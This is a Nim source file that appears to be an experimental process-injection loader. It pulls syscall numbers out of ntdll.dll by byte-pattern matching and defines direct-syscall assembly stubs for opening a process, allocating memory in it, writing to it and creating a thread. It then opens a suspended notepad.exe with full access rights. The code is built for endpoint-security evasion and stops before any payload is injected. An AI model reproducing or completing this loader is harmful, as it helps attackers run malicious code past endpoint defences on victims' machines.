## WARNING: --opt:speed breaks it!
import winim
import hmatching
# import strenc

{.passC: "-masm=intel".}

proc getSyscall(dll: HMODULE, procname: string): int16 =
  var pntCreateThread: pointer = dll.GetProcAddress(procname)
  var antCreateThread: ptr array[20, byte] = cast[ptr array[20, byte]](pntCreateThread)
  # var coll: seq[byte] = @[]
  for idx in 0 ..< 20:
    let cur = antCreateThread[idx].byte
    let six = @[
      antCreateThread[idx].byte,
      antCreateThread[idx + 1].byte,
      antCreateThread[idx + 2].byte,
      antCreateThread[idx + 3].byte,
      antCreateThread[idx + 4].byte,
      antCreateThread[idx + 5].byte,
    ]
    if six.matches([0x4c, 0x8b, 0xd1, 0xb8, @a, @b]):
      var arr: array[2, byte] = [a, b]
      var wor: int16 = cast[int16](arr)
      return wor
      break

import print
var ntdll = LoadLibrary("ntdll.dll")
 # print ntdll.getSyscall("NtOpenProcess").toHex()
 # print ntdll.getSyscall("NtAllocateVirtualMemory").toHex()
 # print ntdll.getSyscall("NtWriteVirtualMemory").toHex()
 # print ntdll.getSyscall("NtCreateThreadEx").toHex()
 # print ntdll.getSyscall("NtClose").toHex()
 # print ntdll.getSyscall("NtCreateThread").toHex()
 # print ntdll.getSyscall("NtOpenFile").toHex()
 # print ntdll.getSyscall("NtProtectVirtualMemory").toHex()


## Global syscall table
template generateGlobalSyscallTable() {.dirty.} =
  var sysNtOpenProcess = ntdll.getSyscall("NtOpenProcess")
  var sysNtAllocateVirtualMemory = ntdll.getSyscall("NtAllocateVirtualMemory")
  var sysNtWriteVirtualMemory = ntdll.getSyscall("NtWriteVirtualMemory")
  var sysNtCreateThreadEx = ntdll.getSyscall("NtCreateThreadEx")
  var sysNtClose = ntdll.getSyscall("NtClose")
  var sysNtCreateThread = ntdll.getSyscall("NtCreateThread")
  var sysNtOpenFile = ntdll.getSyscall("NtOpenFile")
  var sysNtProtectVirtualMemory = ntdll.getSyscall("NtProtectVirtualMemory")
  echo sysNtOpenProcess


generateGlobalSyscallTable()
FreeLibrary(ntdll)


# {.push stackTrace:off.}
# template syscall(num: WORD) =
#   asm """
#       MOV        %RCX, %R10
#       MOV        `num`, %EAX
#       SYSCALL
#   """

{.push stackTrace: off.}
proc MyNtOpenProcess*(ProcessHandle: PHANDLE, AccessMask: ACCESS_MASK,
      ObjectAttributes: POBJECT_ATTRIBUTES,
          ClientId: PCLIENT_ID): NTSTATUS {.fastcall, asmNoStackFrame.} =
  asm """
      MOV        R10, RCX
      MOV        EAX, `sysNtOpenProcess`
      SYSCALL
      ret
  """
{.pop.}

{.push stackTrace: off.}
proc MyNtAllocateVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID,
    ZeroBits: ULONG_PTR, RegionSize: PSIZE_T, AllocationType: ULONG,
        Protect: ULONG): NTSTATUS {.fastcall, asmNoStackFrame.} =
  asm """
      MOV        R10, RCX
      MOV        EAX, `sysNtAllocateVirtualMemory`
      SYSCALL
      ret
  """
{.pop.}

{.push stackTrace: off.}
proc MyNtWriteVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID,
    Buffer: PVOID, NumberOfBytesToWrite: ULONG,
    NumberOfBytesWritten: PULONG): NTSTATUS {.fastcall, asmNoStackFrame.} =
  asm """
      MOV        R10, RCX
      MOV        EAX, `sysNtWriteVirtualMemory`
      SYSCALL
      ret
  """
{.pop.}

{.push stackTrace: off.}
proc NtCreateThread(
    ThreadHandle: PHANDLE,
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: POBJECT_ATTRIBUTES,
    ProcessHandle: HANDLE,
    ClientId: PCLIENT_ID,
    ThreadContext: PCONTEXT,
    InitialTeb: PTEB, #PINITIAL_TEB,
    CreateSuspended: BOOLEAN): NTSTATUS {.fastcall, asmNoStackFrame.} =
  asm """
      MOV        R10, RCX
      MOV        EAX, `sysNtCreateThread`
      SYSCALL
      ret
  """
{.pop.}



# import winim
# MyNtOpenProcess()



import osproc, os
let tProcess = startProcess("notepad.exe")
tProcess.suspend() # That's handy!
# sleep(1000)
var cid: CLIENT_ID
var oa: OBJECT_ATTRIBUTES
var pHandle: HANDLE

cid.UniqueProcess = tProcess.processID

var status = MyNtOpenProcess(
    &pHandle,
    PROCESS_ALL_ACCESS,
    &oa, &cid
)
echo status
echo "[*] pHandle: ", pHandle
